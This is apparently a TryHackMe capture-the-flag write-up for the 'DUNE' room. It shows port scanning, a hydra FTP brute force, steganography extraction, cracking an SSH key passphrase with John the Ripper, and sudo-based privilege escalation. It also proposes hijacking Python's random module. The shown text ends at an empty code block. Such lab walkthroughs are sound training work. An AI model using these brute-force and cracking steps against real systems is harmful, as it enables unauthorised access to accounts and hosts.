# TryHackMe: DUNE

https://tryhackme.com/room/dune

## 1. Network Enumeration

Use `nmap` to run a quick port scan to see what services are running on the box:

```
$ nmap <ip-address>        
                           
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-22 19:09 CET
Nmap scan report for <ip-address>
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.04 seconds
```

We see that this box is running the following services: FTP, SSH, and HTTP. Let's take a look at the HTTP server.

## 2. Web Server

The home page of the web server gives a quick summary of Frank Herbert's sci-fi book DUNE, but doesn't appear to show any other useful information. Lets start `gobuster` to see if we can find any hidden web pages.

```
$ gobuster -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ip-address>/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/22 19:19:01 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2024/01/22 19:20:31 Finished
=====================================================
```

We found an `/images` directory, but nothing there looks particularly interesting. We also found a `robots.txt` file. Let's check it out:

```
User-Agent: *
Disallow: /chapterhouse/
```

Okay, great! Let's check out `/chapterhouse`.

We found our first flag at the bottom of the page: `DUNE{NotTheFlag}`
We also see that Jessica instruct us (Paul) to find Duncah Idaho, and she gives us the key information that Duncan has a weak password. Let's see if we can use the username `duncan` to brute force entry into FTP or SSH.

## 3. FTP

Before we attempt to brute force our way into FTP, let's check if we can login as `anonymous`.

```
$ ftp anonymous@<ip-address>
Connected to <ip-address>.
220 Swordmaster Duncan Idaho's Quarters
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed

```

Anonymous login is not enabled, but we learned that the FTP server is "Duncan Idaho's Quarters". Looks like we're in the right place. Let's try using `hydra`` to brute force Duncan's password using the rockyou.txt wordlist:

```
$ hydra -l duncan -P /usr/share/wordlists/rockyou.txt <ip-address> ftp -t 64
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 19:33:30
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://<ip-address>:21/
[21][ftp] host: <ip-address>   login: duncan   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
```

Great, we found a password! Let's login to FTP and have a look around.

```
$ ftp duncan@<ip-address>                                                   
Connected to <ip-address>.
220 Swordmaster Duncan Idaho's Quarters
331 Please specify the password.
Password: duncan
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59339|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             621 Jan 22 15:32 message.txt
-rw-r--r--    1 0        0          135121 Jan 22 15:32 signet_ring.jpg
226 Directory send OK.
```

There are a couple files present, let's download them both and have a closer look. `message.txt` gives us the second flag: `DUNE{NotTheFlag}`. It also tells us that Duke Leto left his signet ring for us, and that it was encrypted with some sort of secret message. Let's examine the `signet_ring.jpg` file.

## 4. Steganography

The image is a picture of the character Duncan Idaho. Let's examine the EXIF data:

```
$ exiftool signet_ring.jpg 
ExifTool Version Number         : 12.40
File Name                       : signet_ring.jpg
Directory                       : .
File Size                       : 132 KiB
File Modification Date/Time     : 2024:01:22 14:25:08+01:00
File Access Date/Time           : 2024:01:22 15:11:34+01:00
File Inode Change Date/Time     : 2024:01:22 15:11:34+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <redacted>
Image Width                     : 1600
Image Height                    : 900
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1600x900
Megapixels                      : 1.4
```

Interesting, the `Comment` field looks like it contains some base64 encoded text. Let's check:

```
$ echo "<redacted>" | base64 --decode
<redacted>
```

It looks like we may have found another password, but for what? I tried logging in to SSH and FTP as the user `paul` with this password, but it did not work. Let's take a closer look at the `signet_ring.jpg` image. I'll try using `steghide` to check if the Duke's secret message was hidden within this image using the password we just found:

```
$ steghide extract -sf signet_ring.jpg
Enter passphrase: <redacted>
wrote extracted data to "hidden.txt".
```

It worked! The hidden message tells us to join the Duke in his private quarters to complete our trianing: `/<redacted>`

This looks a file path, let's try navigating to `/<redacted>` on the web server.

## 5. Web Server Part 2

I tried to access the web page `/<redacted>`, but I was immediately redirected to a different page. On this page, the Baron Vladimir Harkonnen gives us our third flag: `DUNE{NotTheFlag}`. He also explains that we've fallen into his trap, and we'll need to be more careful if we want to get past him. Let's try using `view-source` to see if we can avoid being redirected.

`view-source:http://<ip-address>/<redacted>`

Looks like it worked, we can view the source code. There is a snippes of `javascript` in the header of the page that was redirecting us. To view the rendered page, we can disable `javascript` and navigate to `/<redacted>` again.

This page reveals to us our fourth flag: `DUNE{NotTheFlag}`. It also contains what looks like our (`paul`'s) SSH private key! Let's see if we can SSH into the box.

## 6. SSH

I tried logging in as `paul` using that SSH key, but it requires a passphrase. Let's see if we can brute force the passphrase using John the Ripper! First step is convert the SSH key into the raw hash format that John the Ripper can consume.

The following command uses the `ssh2john` utility from John the Ripper to extract the hash from the SSH key (called `id_rsa`) and dump the output into a new file called `hash`:

```
$ python /opt/john/run/ssh2john.py id_rsa > hash
```
Now we can try to brute force the passphrase using theJohn the Ripper and the rockyou.txt wordlist:

```
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<redacted>          (id_rsa)     
1g 0:00:00:00 DONE (2024-01-22 20:18) 2.273g/s 1403Kp/s 1403Kc/s 1403KC/s melaniez..mela15
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Got it! Now we can use this passphrase to login as `paul` via SSH: `$ ssh -i id_rsa paul@<ip-address>`. When we get in, the opening banner message shows a conversation between us (`paul`) and `stilgar` the Fremen. He says that if we are able to ride a desert sandworm, he will let use join the Fremen.

## 7. Pirvilege Escalation

Right away we get our next flag from `paul.flag`: `DUNE{NotTheFlag}`. There is also an file called `ride-sandworm` in our home directory, but we have no permissions for it. I first checked to see if we were in any intersting groups, but we are not. Now let's check if we have any entries in the `sudoer` file:

```
$ sudo -l
Matching Defaults entries for paul on arrakis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User paul may run the following commands on arrakis:
    (root) NOPASSWD: /home/paul/ride-sandworm
```

Great, we can run the `ride-sandworm` binary as root! Let's try it:

```
$ sudo /home/paul/ride-sandworm
There are no sandworms in the area, you will need to call one.
```

Hmm seems like we'll need to find a way to "call" a sandworm. We'll have to come back to this later. Let's check out `/home` to see what other users are on this machine.

We found the home directory for `stilgar`, and we have `read` access to it! Let's see what's there:

```
$ ls -l /home/stilgar
total 48
-rw-r----- 1 stilgar fremen    888 Jan 22 15:32 raid-the-harkonnens.py
-rw-r----- 1 stilgar fremen     32 Jan 22 15:32 stilgar.flag
-rwxr-x--x 1 stilgar fremen  16784 Jan 22 15:32 thumper*
```

There are a few intersting files, but the only one we have any permissions for is `thumper`. Let's try executing it and see what happens:

```
$ ./thumper 
You've activated a thumper, which is a device that generates rhythmic vibrations in the sand, attracting sandworms. Get ready, a sandworm is coming!
```

Oh boy, here it comes. Let's try running the `ride-sandworm` binary again:

```
$ sudo /home/paul/ride-sandworm
Congratulation, you rode a sandworm. You are now one with the Fremen people, a member of their group.
```

Hmm let's check what groups we're in now...Yes! We're now part of the `fremen` group!

## 8. Privilege Escalation Part 2

Now that we're a member of the `fremen` group, we can access more files in `stilgar`'s home directory. For examle we can how read `stilgar.flag`: `DUNE{NotTheFlag}`. We can also read the file `raid-the-harkonnens.py`. Let's try running it to see what it does.

```
$ python3 raid-the-harkonnens.py 
The Fremen raid on the Harkonnens killed 65 Harkonnens.
```

Hmm okay. Let's take a look under the hood:

```
import random

num_harkonnens_killed = random.randint(1,100)
print(f"The Fremen raid on the Harkonnens killed {num_harkonnens_killed} Harkonnens.")
```

It uses python's `random` module to generate a random integer from 1 to 100, then prints it. We can exploit this by adding our own malicious `random` module to execute whatever we wish. Unfortunately this is only useful if we can run `python3` as a privileged user. The `python3` binary doesn't have the SUID bit set, and we can not use `sudo` to run the command. Let's try running `linpeas.sh` to see if we can find any other attack vectors.

```

```